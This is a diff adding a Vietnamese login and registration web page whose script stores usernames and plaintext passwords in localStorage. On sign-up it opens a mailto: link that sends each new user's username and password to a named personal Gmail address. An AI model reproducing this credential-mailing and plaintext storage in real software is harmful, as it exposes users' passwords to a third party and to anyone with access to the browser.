@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng Nhập & Đăng Ký</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: url('https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExYnliaWk3dG83eWY3anVxZWg0bnZvaGplbXgyaHJxMHU3bXJoOG5mMCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/NKEt9elQ5cR68/giphy.gif') no-repeat center center fixed;
+            background-size: cover;
+        }
+
+        .container {
+            background-color: rgba(0, 0, 0, 0.6);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
+            max-width: 400px;
+            width: 100%;
+            position: relative;
+        }
+
+        h2 {
+            color: #fff;
+            text-align: center;
+        }
+
+        .form-container, .gray-page {
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007BFF;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .logout-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #FF0000;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 5px;
+            cursor: pointer;
+            display: none;
+            font-size: 12px;
+        }
+
+        .logout-button:hover {
+            background-color: #cc0000;
+        }
+
+        p {
+            color: #fff;
+            text-align: center;
+        }
+
+        a {
+            color: #00f;
+            text-decoration: none;
+        }
+
+        .gray-page {
+            background-color: #808080;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: absolute;
+            top: 0;
+            left: 0;
+            flex-direction: column;
+            color: #fff;
+            font-size: 24px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="form-container" id="login-form">
+            <h2>Đăng Nhập</h2>
+            <form onsubmit="login(event)">
+                <input type="text" id="login-username" placeholder="Tên đăng nhập" required>
+                <input type="password" id="login-password" placeholder="Mật khẩu" required>
+                <button type="submit">Đăng Nhập</button>
+            </form>
+            <p>Bạn chưa có tài khoản? <a href="#register" onclick="showRegisterForm()">Đăng ký ngay</a></p>
+        </div>
+
+        <div class="form-container" id="register-form">
+            <h2>Đăng Ký</h2>
+            <form onsubmit="register(event)">
+                <input type="text" id="register-username" placeholder="Tên đăng nhập (ít nhất 6 ký tự)" required>
+                <input type="password" id="register-password" placeholder="Mật khẩu" required>
+                <button type="submit">Đăng Ký</button>
+            </form>
+            <p>Bạn đã có tài khoản? <a href="#login" onclick="showLoginForm()">Đăng nhập tại đây</a></p>
+            <p class="notification" id="register-notification">Đăng ký thành công!</p>
+            <p class="error" id="register-error">Lỗi: Vui lòng kiểm tra lại thông tin!</p>
+        </div>
+    </div>
+
+    <div class="gray-page" id="gray-page">
+        HELLO WORLD!
+        <button class="logout-button" id="logout-button" onclick="logout()">Đăng Xuất</button>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const isLoggedIn = localStorage.getItem('isLoggedIn');
+            
+            if (isLoggedIn === 'true') {
+                showGrayPage();
+            } else {
+                showLoginForm(); // Hiển thị form đăng nhập khi trang được tải
+            }
+        });
+
+        function showRegisterForm() {
+            document.getElementById('login-form').style.display = 'none';
+            document.getElementById('register-form').style.display = 'block';
+            document.getElementById('gray-page').style.display = 'none';
+        }
+
+        function showLoginForm() {
+            document.getElementById('register-form').style.display = 'none';
+            document.getElementById('login-form').style.display = 'block';
+            document.getElementById('gray-page').style.display = 'none';
+        }
+
+        function showGrayPage() {
+            document.querySelector('.container').style.display = 'none';
+            document.getElementById('gray-page').style.display = 'flex';
+            document.getElementById('logout-button').style.display = 'block';
+        }
+
+        function register(event) {
+            event.preventDefault();
+            const username = document.getElementById('register-username').value;
+            const password = document.getElementById('register-password').value;
+            const storedUsername = localStorage.getItem('username');
+
+            // Kiểm tra nếu tên đăng nhập có ít nhất 6 ký tự
+            if (username.length < 6) {
+                showError("Tên đăng nhập phải có ít nhất 6 ký tự.");
+                return;
+            }
+
+            // Kiểm tra nếu tên đăng nhập đã tồn tại
+            if (username === storedUsername) {
+                showError("Tên đăng nhập đã tồn tại.");
+                return;
+            }
+
+            // Lưu thông tin vào LocalStorage
+            localStorage.setItem('username', username);
+            localStorage.setItem('password', password);
+
+            // Hiển thị thông báo đăng ký thành công
+            document.getElementById('register-notification').style.display = 'block';
+
+            // Gửi thông tin đăng ký qua email
+            window.location.href = `mailto:nguyenngoctrivinh72@gmail.com?subject=New Registration&body=Username: ${username}%0D%0APassword: ${password}`;
+
+            setTimeout(() => {
+                showLoginForm();
+            }, 2000); // Chuyển về form đăng nhập sau 2 giây
+        }
+
+        function showError(message) {
+            const errorElement = document.getElementById('register-error');
+            errorElement.textContent = `Lỗi: ${message}`;
+            errorElement.style.display = 'block';
+        }
+
+        function login(event) {
+            event.preventDefault();
+            const username = document.getElementById('login-username').value;
+            const password = document.getElementById('login-password').value;
+
+            // Kiểm tra thông tin đăng nhập
+            if (username === localStorage.getItem('username') && password === localStorage.getItem('password')) {
+                localStorage.setItem('isLoggedIn', 'true');
+                showGrayPage(); // Chuyển sang trang màu xám
+            } else {
+                alert('Thông tin đăng nhập không chính xác!');
+            }
+        }
+
+        function logout() {
+            localStorage.setItem('isLoggedIn', 'false');
+            showLoginForm();
+        }
+    </script>
+</body>
+</html>
